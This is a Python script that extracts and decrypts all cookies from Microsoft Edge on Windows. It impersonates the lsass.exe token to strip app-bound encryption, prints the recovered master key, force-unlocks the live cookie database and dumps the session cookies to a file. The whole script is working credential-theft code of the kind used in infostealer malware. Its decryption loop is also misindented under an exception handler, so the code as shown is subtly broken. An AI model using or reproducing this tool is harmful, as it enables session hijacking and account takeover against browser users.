"""
Edge v20 cookie decryption script.

Edge user_dec after double DPAPI has a simple structure:
  4 bytes: header_len (usually 32)
  header_len bytes: header (contains Edge install path in ASCII)
  4 bytes: content_len (usually 32)
  content_len bytes: raw AES-GCM master key

This works without needing CNG keys or flag-based decryption.
"""

import os, io, shutil, json, struct, ctypes, sqlite3, pathlib, binascii, sys, tempfile
from ctypes.wintypes import DWORD, WCHAR, UINT
from contextlib import contextmanager

import windows
import windows.crypto
import windows.generated_def as gdef
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


@contextmanager
def impersonate_lsass():
    """Impersonate lsass.exe token with SeDebugPrivilege for ABE key access."""
    orig = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        imp = proc.token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation,
        )
        windows.current_thread.token = imp
        yield
    finally:
        windows.current_thread.token = orig


def _rstrtmgr_copy(src, dst):
    """Unlock and copy a file using Restart Manager."""
    rstrtmgr = ctypes.windll.LoadLibrary("Rstrtmgr")

    @ctypes.WINFUNCTYPE(None, UINT)
    def _cb(pct):
        pass

    sh = DWORD(0)
    sf = DWORD(0)
    sk = (WCHAR * 256)()
    rstrtmgr.RmStartSession(ctypes.byref(sh), sf, sk)
    try:
        rstrtmgr.RmRegisterResources(
            sh, 1, ctypes.byref(ctypes.pointer(ctypes.create_unicode_buffer(src))),
            0, None, 0, None,
        )
        rstrtmgr.RmShutdown(sh, 1, _cb)
    finally:
        rstrtmgr.RmEndSession(sh)
    shutil.copy2(src, dst)


def copy_unlocked(src, dst):
    """Copy file, trying normal copy first then Rstrtmgr fallback."""
    try:
        shutil.copy2(src, dst)
    except PermissionError:
        _rstrtmgr_copy(src, dst)


def decrypt_cookie_val(cipher, ev):
    """Decrypt a v20 cookie value. ev = b'v20' + iv(12) + ciphertext(N) + tag(16)."""
    iv, ct, tag = ev[3:15], ev[15:-16], ev[-16:]
    pt = cipher.decrypt(iv, ct + tag, None)
    return pt[32:].decode('utf-8')


def to_netscape(cookies):
    lines = ["# Netscape HTTP Cookie File", ""]
    for host, name, value, secure, httponly, expiry in cookies:
        domain = host if host.startswith('.') else '.' + host
        lines.append(
            f"{domain}\tTRUE\t/\t{'TRUE' if secure else 'FALSE'}\t{expiry}\t{name}\t{value}"
        )
    return '\n'.join(lines)


def extract_master_key(user_dec):
    """Extract AES-GCM master key from Edge user_dec.

    Expected structure:
      4 bytes: header_len (usually 32)
      header_len bytes: header (ASCII text like Edge install path)
      4 bytes: content_len (usually 32)
      content_len bytes: raw AES-GCM master key

    Returns the master key bytes.
    """
    header_len = struct.unpack('<I', user_dec[:4])[0]
    content_len_offset = 4 + header_len
    content_len = struct.unpack('<I', user_dec[content_len_offset:content_len_offset + 4])[0]
    master_key_offset = content_len_offset + 4
    master_key = user_dec[master_key_offset:master_key_offset + content_len]
    return master_key, header_len, content_len


def main():
    if not is_admin():
        print("NOTE: Administrator privileges required for Edge cookie decryption.")
        sys.exit(1)

    up = os.environ['USERPROFILE']
    ls_path = rf"{up}\AppData\Local\Microsoft\Edge\User Data\Local State"
    db_path = rf"{up}\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies"
    out_path = sys.argv[1] if len(sys.argv) > 1 else None

    if not os.path.exists(ls_path):
        print(f"ERROR: Edge Local State not found at: {ls_path}")
        sys.exit(1)

    # Read app_bound_encrypted_key from Local State
    with open(ls_path, 'r', encoding='utf-8') as f:
        ls = json.load(f)

    abek_b64 = ls["os_crypt"]["app_bound_encrypted_key"]
    abek = binascii.a2b_base64(abek_b64)
    assert abek[:4] == b"APPB", f"Expected APPB header, got {abek[:4]!r}"
    enc_key = abek[4:]

    # Step 1: SYSTEM DPAPI decrypt
    print("[1/4] SYSTEM DPAPI decrypt (impersonating lsass)...")
    with impersonate_lsass():
        sys_dec = windows.crypto.dpapi.unprotect(enc_key)

    # Step 2: User DPAPI decrypt
    print("[2/4] User DPAPI decrypt...")
    user_dec = windows.crypto.dpapi.unprotect(sys_dec)
    print(f"  user_dec length: {len(user_dec)} bytes")

    # Step 3: Extract master key from user_dec
    print("[3/4] Extracting master key...")
    master_key, header_len, content_len = extract_master_key(user_dec)
    print(f"  header_len: {header_len}, content_len: {content_len}")
    print(f"  Master key: {master_key.hex()}")

    # Step 4: Decrypt cookies
    print("[4/4] Decrypting cookies...")
    with tempfile.TemporaryDirectory() as td:
        tmp_db = os.path.join(td, "Cookies")
        copy_unlocked(db_path, tmp_db)
        print("  Cookie database copied OK")

        con = sqlite3.connect(pathlib.Path(tmp_db).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        cur.execute(
            "SELECT host_key, name, CAST(encrypted_value AS BLOB), "
            "is_secure, is_httponly, expires_utc FROM cookies"
        )
        all_cookies = cur.fetchall()
        con.close()

        v20 = [c for c in all_cookies if len(c[2]) > 3 and c[2][:3] == b"v20"]
        v10 = [c for c in all_cookies if len(c[2]) > 3 and c[2][:3] == b"v10"]
        dpapi = [c for c in all_cookies if len(c[2]) > 5 and c[2][0] == 1]
        print(f"  Total: {len(all_cookies)}, v20: {len(v20)}, v10: {len(v10)}, dpapi: {len(dpapi)}")

    # Derive v10 AES-GCM key from os_crypt.encrypted_key
    v10_cipher = None
    try:
        enc_key_b64 = ls["os_crypt"]["encrypted_key"]
        import base64 as _b64
        enc_key_raw = _b64.b64decode(enc_key_b64)
        if enc_key_raw[:5] == b"DPAPI":
            v10_key = windows.crypto.dpapi.unprotect(enc_key_raw[5:])
            v10_cipher = AESGCM(v10_key)
    except Exception:
        pass

        cipher = AESGCM(master_key)
        result = []
        failed = 0
        for c in all_cookies:
            ev = c[2]
            if len(ev) > 3 and ev[:3] == b"v20":
                try:
                    val = decrypt_cookie_val(cipher, ev)
                    result.append((c[0], c[1], val, c[3], c[4], str(c[5] or 0)))
                except Exception:
                    failed += 1
            elif len(ev) > 3 and ev[:3] == b"v10" and v10_cipher is not None:
                try:
                    iv, ct_tag = ev[3:15], ev[15:]
                    pt = v10_cipher.decrypt(iv, ct_tag, None)
                    val = pt.decode('utf-8')
                    result.append((c[0], c[1], val, c[3], c[4], str(c[5] or 0)))
                except Exception:
                    failed += 1
            elif len(ev) > 5 and ev[0] == 1:
                try:
                    val = windows.crypto.dpapi.unprotect(ev[1:]).decode('utf-8')
                    result.append((c[0], c[1], val, c[3], c[4], str(c[5] or 0)))
                except Exception:
                    failed += 1
            elif len(ev) > 0 and ev[0] != 1:
                try:
                    val = ev.decode('utf-8')
                    result.append((c[0], c[1], val, c[3], c[4], str(c[5] or 0)))
                except Exception:
                    pass

        content = to_netscape(result)
        if out_path:
            with open(out_path, 'w', encoding='utf-8') as f:
                f.write(content)
            print(f"  Saved {len(result)} cookies ({failed} failed) to {out_path}")
        else:
            print(content)


if __name__ == "__main__":
    main()
